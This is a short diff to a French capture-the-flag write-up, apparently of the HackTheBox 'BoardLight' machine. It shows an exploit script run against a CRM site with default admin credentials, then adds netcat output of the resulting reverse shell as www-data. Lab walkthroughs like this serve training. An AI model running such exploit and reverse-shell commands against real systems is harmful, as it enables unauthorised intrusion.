@@ -157,3 +157,12 @@ Puis, on lance le script:
 ```bash
 python3 exploit.py http://crm.board.htb/ admin admin 10.10.14.252 9001
 ```
+
+Une connexion est établie avec netcat:
+```bash
+listening on [any] 9001 ...
+connect to [10.10.14.252] from (UNKNOWN) [10.129.52.52] 43820
+bash: cannot set terminal process group (875): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
+```
